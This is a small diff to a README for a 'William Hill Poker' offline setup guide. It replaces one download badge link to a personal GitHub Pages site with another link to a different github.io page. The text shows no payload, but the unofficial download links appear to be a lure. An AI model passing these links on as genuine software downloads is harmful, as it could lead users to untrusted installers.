@@ -1,6 +1,6 @@
 # William Hill Poker — Offline Setup Guide
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://daiseytriblett.github.io/.github/william-hill-poker)
+[![Open William Poker](https://img.shields.io/badge/Open-William%20Poker-1D4ED8?style=for-the-badge)](https://william-poker.github.io/.github/)
 
 ---
 
